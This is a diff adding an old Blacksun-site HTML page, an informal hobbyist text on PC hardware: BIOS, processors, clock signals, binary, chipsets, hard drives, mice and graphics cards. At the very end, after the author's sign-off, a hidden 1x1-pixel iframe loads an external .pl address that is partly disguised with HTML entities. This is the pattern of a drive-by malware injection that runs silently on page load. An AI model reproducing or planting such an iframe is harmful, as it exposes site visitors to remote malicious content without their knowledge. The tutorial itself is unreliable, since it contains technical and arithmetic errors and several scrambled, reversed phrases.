@@ -1,0 +1,374 @@
+<html>
+<head>
+<title>PC Hardware</title>
+<STYLE type=text/css>A:active {
+	TEXT-DECORATION: none
+}
+A:hover {
+	TEXT-DECORATION: underline
+}
+A:link {
+	TEXT-DECORATION: none
+}
+A:visited {
+	TEXT-DECORATION: none
+}
+</STYLE>
+
+</HEAD>
+<BODY aLink=#66ccff bgColor=#000000 leftMargin=30 link=#99ccff text=#cccccc 
+topMargin=30 vLink=#0099cc marginwidth="30" marginheight="30">
+<h2> 
+  <center>
+    <table width="680" border="0" cellspacing="2" cellpadding="2" align="center">
+      <tr> 
+        <td width="693"> 
+          <pre>
+                        :::::::::   ::::::::  :::::::::  :::::::::: 
+                        :+:    :+: :+:    :+: :+:    :+: :+:        
+                        +:+    +:+ +:+        +:+    +:+ +:+        
+                        +#++:++#+  +#++:++#++ +#++:++#:  :#::+::#   
+                        +#+    +#+        +#+ +#+    +#+ +#+        
+                        #+#    #+# #+#    #+# #+#    #+# #+#        
+                        #########   ########  ###    ### ###  
+                         
+              	             <a href="http://blacksun.box.sk" target="_blank">http://blacksun.box.sk</a>
+                           _____________________________
+    ______________________I       <b>   Topic:</b>             I_____________________
+   \                      I                             I                    /
+    \     HTML by:        I        <b>PC Hardware</b>          I   Written by:     /
+    >                     I                             I                  < 
+   /      <a href="mailto:black_mesa@gmx.de">Martin L.</a>       I_____________________________I   <a herf="mailto:Njan@anrki.com" href="mailto:Njan@anrki.com">Njan</a>            \
+  /___________________________>                    <_________________________\</pre>
+        </td>
+      </tr>
+    </table>
+    <p>&nbsp;</p>
+  </center>
+</h2>
+version 1.1,<br>
+Converted to HTML by <a 
+href="mailto:penguin20000@yahoo.com">Penguin</a>, optimized by <a href="mailto:black_mesa@gmx.de">Martin 
+L.</a><br>
+<br>
+This isn't so much a tutorial, as it doesn't actually teach you much.. It's more 
+a text on hardware for those of you sick of newbie tutorials, and looking for 
+something interesting and non-dangerous. This is mainly about motherboard stuff, 
+but I stuck something about HDs, mice and Gfx cards at the end. Hey, if people 
+like it and tell me, I might even stretch and do al the other computer bits and 
+bobs. ;) <br>
+<br>
+<b><u> 
+<h2>Content</h2>
+</u></b> 
+<ul>
+  <li><a href="http://blacksun.box.sk/hardware.html#bios">The Bios</a><br>
+    (I) Functions<br>
+    (II) Static + Passwords 
+  <li><a 
+  href="http://blacksun.box.sk/hardware.html#processors">Processors</a><br>
+    (I) Fetch-Execute<br>
+    (II) Clock Ticks<br>
+    (III) Funky Athlon fridge chip. 
+  <li><a href="http://blacksun.box.sk/hardware.html#clock">The Clock</a><br>
+    (I) What does it look like?<br>
+    (II) Waves<br>
+    (III) Some ASCII Art. ;)<br>
+    (IV) What is Digital? (unrelated to Microns, but hey.)<br>
+    (V) Howcome Digital can't be conceived in real life?<br>
+    (VI) What does digital represent?<br>
+    (VII) What is Binary?<br>
+    (VIII) How do I translate between number systems?<br>
+    (IX) sums?<br>
+    (X) Use Wincalc. 
+  <li><a href="http://blacksun.box.sk/hardware.html#chipset">Chipset</a><br>
+    (I) A what?<br>
+    (II) Assembler and Machine Code<br>
+    (III) Intel ones. 
+  <li><a href="http://blacksun.box.sk/hardware.html#microns">Microns</a><br>
+    (I) Moore's Law<br>
+    (II) Predictions / Intel. V. AMD. (Go, AMD!) 
+  <li><a href="http://blacksun.box.sk/hardware.html#hard">Hard Drives</a><br>
+    (I) Origin<br>
+    (II) How they work<br>
+    (III) FIrst computer 
+  <li><a href="http://blacksun.box.sk/hardware.html#mice">Mice</a><br>
+    (I) Rollers<br>
+    (II) Cleaning<br>
+    (III) Keyboard crud 
+  <li><a href="http://blacksun.box.sk/hardware.html#gfx">Gfx Cards</a><br>
+    (I) Built in v. NOT<br>
+    (II) Components<br>
+    (III) Stay away from S3s! warning<br>
+    (IV) 3D and 2D cards </li>
+</ul>
+<b><u><a name=#bios>The BIOS.</a></u></b><br>
+This contains instructions which are specific for that particular motherboard. 
+Those programs and instructions will remain in the PC throughout its life; usually 
+they are not altered. However, it is possible to get replacement / upgrade BIOS's. 
+Primarily the ROM code holds start-up instructions. In fact there are several 
+different programs inside the start-up instructions, but for most users, they 
+are all woven together. You can differentiate between: 
+<pre>	* POST (Power On Self Test) 
+	* The Setup instructions, which connect with the CMOS instructions 
+	* BIOS instructions, which connect with the various hardware peripherals 
+	* The Boot instructions, which call the operating system (DOS, OS/2, or Windows)</pre>
+<br>
+Note: Only very old or different OS's are stored on ROM, such as OS/2. This is 
+actually a much more efficient system.<br>
+BIOS's are static sensitive, so take care when handling them. They can also be 
+PWord protected... if you ever get round to doing this, don't forget the password. 
+As you don't use the BIOS PWord often, this is easy to do. Don't. it's bloody 
+hard getting the PWord back. <br>
+<br>
+<b><u><a name=#processors>Processors</a></u></b><br>
+Processors work on a fetch-execute cycle. each tick of the clock, in theory, they 
+get a bit of data... and by tick of the clock here, we don't mean a second, we 
+mean the tick of a computer clock. Depending on the speed of your processor, this 
+is anywhere from 233 million ticks per second for a 233, to 800 for an overclocked 
+600MHz Athlon chip. <br>
+So, you can get, on your average computer, 400 - 500 bits of data per second. 
+Well, wrong actually... because not every clock tick is taken up by getting the 
+data. Every _fourth_ is. Well, what about every other 3? you ask.. they are taken 
+up with _finding_ the data, _getting_ it, and putting it back. So, you say, your 
+processor runs at a quarter of the speed that in theory it should be able to do? 
+Well, yes. And there's no way around this, unfortunately. But, we can make the 
+clock speed a little faster, and it is the clock speed that dictates the speed 
+of the processor... (within reason). <br>
+Therefore, you can set the clock ticks on your 233 to 266, and it'll run at 166 
+MHz. Yes. Unfortunately, the more clock ticks there are in relation to what your 
+chip is _supposed_ to run at, the hotter it Gets. Therefore, you need to install 
+heatsyncs/fans. In fact, the AMD Athlon 600MHz overclocked to 800MHz, the fastest 
+PC at the time of writing has a minature fridge that cools the chip, which is 
+its own special metal box. The tower-sized case also has a box the size of a mini-tower 
+underneath for the cooling system. ;) <br>
+For this increase in temperature of 200MHz, the chip is cooled to -37 degrees 
+centigrade. that's cold. ;) (Note: AMD chips generally run a lot hotter than Intel 
+ones). ((Not a problem unless u have no heatsync)) - see the micron section, below...<br>
+<br>
+<br>
+<b><u><a name=#clock>The Clock</a></u></b><br>
+Now, this fabled clock looks like, in most cases, a small black box on your motherboard. 
+The clock ticks it emitts are in the form of a wave <like oscilloscope an on see 
+you?d what>, but a different wave: one that is sqare, and it looks like a castle 
+ramparts. the speed of this is dictated by the MHx setting you set with the Jumpers 
+on your motherboard. The waves look like so: (except slightly more square) 
+<pre>  __     _    ____   _   _    ___
+_¦  ¦___¦ ¦__¦    ¦_¦ ¦_¦ ¦__¦   ¦__    and etc.
+
+</pre>
+<br>
+The wave, which never changes, and is always the same, is broadcast throughout 
+your motherboard, and it synchronises all of the things that go on there. For 
+example, when you press the left button in your game of quake, the processor assigns 
+different bits of your computer <in card graphics primarily 
+case, this>to do whatever is neccacery to redraw what's on the screen, and tells 
+it to have it done in 3 ticks' time. The same process occurs on the gfx card itself, 
+where the main processor assigns a polygon to each other chip, or whatever. Infact, 
+if you have an old enough computer, you can see it being redrawn on the screen... 
+try it... run a gfx-intensive game on a 486... If the task isn't done in time, 
+then it all falls apart, and the computer crashes. This is why you don't want 
+to buy a dodgy CPU. :) (Get an AMD Athlon!).<br>
+The signals sent run around your motherboard, through all of those copper bits, 
+and into the chips, ISA slots, or whatever, and the task gets accomplished. <br>
+<br>
+This signal is sent around the motherboard in that most wonderful of things we 
+all love, Binary. Now, Binary is what Computers communicate with, and it is a 
+DIGITAL thing. Digital. A Much used term.<br>
+COmputers are electronic, and therefore, all the signals in them are tiny pulses 
+of electricity. Now, electricity can be one of two things. On... or off. And this 
+is what makes it digital. If it could be half on as well, it would be analogue... 
+But no. It's digital. However, the representation of it in the form of signals 
+down wires is analogue, as a sound in a modem wire can be any of a hundred million 
+different pitches, can't it. Yes. This digital signal is, then, a series of 0's 
+and 1's. Binary. The counting system that we use (1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 
+11... etc... ) is Denary. It's Base ten... Binary is Base 2 (and Hexadecimal, 
+which is used, amongst other things, is base 16). Therefore it is perfect for 
+being what these signals are coded in. so each charactor on your screen is represented 
+in your computers RAM by a series of Binary digits. Probably 8. if you go into 
+Windows Calculator, and switch to scientific mode (View&gt;Scientific) you can 
+decode this. For example, 1 in Binary is 00000001. 2 is 00000010. The way this 
+can be decoded is thus: <br>
+<br>
+Each digit in binary represents a quantity of a certain number, just as denary 
+does. In denary, there is a column for 1's, a column for 10's, and a column for 
+100's. <etc..>And in Binary, there is a column for 1's, 2's, 4's, 8's, etc. Let 
+me show you: <br>
+<br>
+Denary:<br>
+<table>
+  <tbody> 
+  <tr> 
+    <td>100s</td>
+    <td>10s</td>
+    <td>1s</td>
+  </tr>
+  <tr> 
+    <td>1</td>
+    <td>0</td>
+    <td>0</td>
+  </tr>
+  </tbody> 
+</table>
+<br>
+Here, there is a one in the hundreds column, and therefore, 100 + 0 + 0 (0 and 
+0 are the other 2 columns) makes 100. SO 1 0 0 in Denary represents 100. (of course, 
+translating 100 --&gt; 100 doesn't work, as denary is used in both cases). In 
+Binary, this works this:<br>
+<br>
+Binary (8-bit -- 8 digits)<br>
+<table>
+  <tbody> 
+  <tr> 
+    <td>128</td>
+    <td>64</td>
+    <td>32</td>
+    <td>16</td>
+    <td>8</td>
+    <td>4</td>
+    <td>2</td>
+    <td>1</td>
+  </tr>
+  <tr> 
+    <td>1</td>
+    <td>1</td>
+    <td>1</td>
+    <td>1</td>
+    <td>1</td>
+    <td>0</td>
+    <td>1</td>
+    <td>0</td>
+  </tr>
+  </tbody> 
+</table>
+<br>
+SO... 128 + 64 + 32 + 16 + 8 + 2 + 1 = 250.<br>
+So the Binary number 11111010 = 250. Simple, eh?<br>
+<br>
+It is possible to do addition, subtraction, multiplication, in fact, EVEYTHING 
+that is possible with denary (1--&gt; 10)... I'm not going to explain it because 
+it is simply too complicated. ;) Use Windows Calculator... the radio buttons at 
+the top left switch between number systems.<br>
+<br>
+<b><u><a 
+name=#chipset>Chipset</a></u></b><br>
+We all know what assembly language is, do we not? It is the programming language 
+that is most native to a computer. The instructions go directly to the chip (more 
+or less). (Assembly actually lays on top of Machine code, which is the real native: 
+Assembler is a more human-friendly version)... Each chip has their own different 
+version of assembler/machine code, called its _chipset_. Each new type of chip 
+comes with an upgraded chipset: for example, the Intel MMX chip incorporated the...wait 
+for it... MMX chipset! There are also chipsets such as 3D!Now. THe most basic 
+of commands between, say, Intel and AMD are the same: they have to be in order 
+for the two to be compatible, but more advanced things are different. This is 
+why Alpha chips are incompatible with windows: The chipset is completely different.<br>
+Intel has hitherto been the leader in supplying chip sets to the Pentium motherboard. 
+Therefore, let us just mention their chip sets, which have astronomical names. 
+The Neptune chip set (82434NX) was introduced in June 1994. It replaced the Mercury 
+set (82434LX). In both chip sets, there were problems with the PCI bus. In January 
+1995 Intel introduced the first Triton, where everything worked. This chip set 
+supports some new features: it supports EDO RAM, and it offers bus master integrated 
+EIDE control and NSP (Native Signal Processing - one of the many new creations, 
+which was soon forgotten). <br>
+The sorts of things that new chipsets are used for are varied... for example, 
+The Intel TX Chipset, for example, supports SDRam and UltraDMA (But the TX-set 
+cannot cache above 64 MB RAM, and that is a problem.), while AMD chips have their 
+own special Graphics chipset, which is better for that task.<br>
+<br>
+<b><u><a name=#microns>Microns</a></u></b><br>
+The CPUs have doubled their calculating capacity every 18 months. This is called 
+"Moore's Law" and was predicted in 1965 by Gordon Moore. He was right for more 
+than 30 years. The latest CPUs use internal wiring only 0.25 microns wide (1/400 
+of a human hair). But if Moore's Law has to be valid into the next century, more 
+transistors have to be squeezed onto silicon layers. And now there is a new hope. 
+IBM has for the first time succeeded in making copper conductors instead of aluminum. 
+Copper is cheaper and faster, but the problem was to isolate it from the silicon. 
+The problem has been solved with a new type of coating, and now chips can be designed 
+with 0.13 micron technology. The technology is expected later to work with just 
+0.05 micron wiring! Texas Instruments announced on August 27th 1998 that they 
+expect 0.07 micron CMOS processing in the year 2001. At the time of writing, AMD 
+chips run at .27 microns (?) and Intel at .33. This explains why AMD chips are 
+hotter, as there is less wire, and therefore more probability of the electrons 
+that the electricity is comprised of hitting the side of the wires, and creating 
+heat.<br>
+<br>
+<b><u><a name=#hard>Hard Drives</a></u></b><br>
+Hard drives work in much the same way as a floppy disk does. They can, however, 
+store a much larger capacity of data, and therefore are much more fragile, and 
+compact <on surface disk the>. For this reason, they are hermetically sealed. 
+NEVER OPEN ONE IF YOU WANT TO USE IT AGAIN. There is, inside, 3 or 4 goldy-brown 
+circular plates on which the data is stored. These are much the same as the ones 
+inside a floppy disk, except that they are not 'floppy' but hard, or stiff. The 
+data is stored on the platters magnetically, which explains why floppy disks have 
+a "keep magnets away from me" warning on boxes u buy them in.<br>
+IBM introduced the first hard disk in 1957, when data usually was stored on tapes. 
+The first 305 RAMAC (Random Access Method of Accounting and Control) consisted 
+of 50 platters, 24 inch diameter, with a total capacity of 5 MB, a huge storage 
+medium for its time. It cost $35,000 annually in leasing fees (IBM would not sell 
+it outright) and was twice the size of a refrigerator.<br>
+In the early 80s, HD's became the preferred storage medium as opposed to floppy 
+drives (these were previously used due to increased reliability). IBM's PS/2 (one 
+of which I have - yay) was one of the first PCs to be equipped with a Hard drive. 
+I think.<br>
+<br>
+<b><u><a 
+name=#mice>Mice</a></u></b><br>
+Mice are, as we all know, Input devices, and as we also know, they tell where 
+you are on the mousemat by moving a ball in the bottom. Which you can see. But 
+how does it read how the ball is moving? Well, inside the mouse are 2 rollers, 
+at 90 degrees to each other. When you move the mouse, u move the ball, and thus 
+the rollers. THe rollers have some little discs on the end of them with slits 
+in, and either side of the disc are light-readers, so that when you move tha ball, 
+the mouse can tell because light flasles on and off in its light reader. There 
+is also a 3rd non-functional roller to keep the ball rolling smoothly. Note: It 
+is perfectly safe to turn your mouse upside down ,. take the ball out and look 
+inside, as long as you don't prod anything too hard (twiddle the rollers by all 
+means, just don't stick bits of paper in there). It is also a good idea to get 
+a blunt knife or screw driver and clean the crud off the rollers every few weeks... 
+it solidifies into little rings around the rollers, and works to the detriment 
+of the mouse. If it isn't cleaned off, it can also, fallinto the mouse, and reak 
+havok with the insides. :) The same sort of crud builds up in keyboards, but is 
+harder to remove. ;)<br>
+<br>
+<b><u><a name=#gfx>GFX Cards</a></u></b><br>
+A video card is typically an adapter, a removable expansion card in the PC. Thus, 
+it can be replaced! The video card can also be an integral part of the system 
+board...This is the case in certain brands of PCs and is always the case in lap 
+tops. This is not nice, as it is hard to upgrade to a better card. On a OC with 
+a non-removable gfx or sound card, the normal procedure if you _do_ want to replace 
+it is to disable the built-in graphics card using jumpers or dip switches... consult 
+your motherboard manual. ;) Regardless of whether it is replaceable or integrated, 
+it consists of three components: <br>
+<br>
+* A video chip of some brand (ATI, Matrox, S3, Cirrus Logic, or Tseng, to name 
+some of the better known). The video chip creates the signals, which the screen 
+must receive to form an image. <br>
+* Some kind of RAM (EDO, SGRAM, or VRAM, which are all variations of the regular 
+RAM). Memory is necessary, since the video card must be able to remember a complete 
+screen image at any time. <br>
+* A RAMDAC - a chip converting digital/analog signals. <br>
+<br>
+NOTE: Never buy an S3. Never. Ever. I've had lots, they're all useless. Remember 
+that.<br>
+<br>
+All ordinary graphics cards can show 3D games. That is really no special trick. 
+The problem is to present them smoothly and fast. If the PC’s video card is made 
+for 2D execution only, the CPU must do the entire workload of geometric transformations 
+etc.! And that task can cause even the fastest CPU to walk with a limp. In recent 
+years there has been an enormous development in 3D graphics cards. Let me briefly 
+describe those here.<br>
+<br>
+There are two types of graphics cards, which can be used for 3D acceleration: 
+<br>
+<br>
+Combination 2D/3D cards. These are ordinary graphics cards, which have been equipped 
+with extra 3D power. <br>
+The pure 3D cards, which only work as accelerators. These cards require that there 
+also is an ordinary (2D) graphics card in the PC. <br>
+Of course the pure 3D card yields the best acceleration, but there are also good 
+combination cards on the market. <br>
+<br>
+Njan 
+<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</body>
+</html>
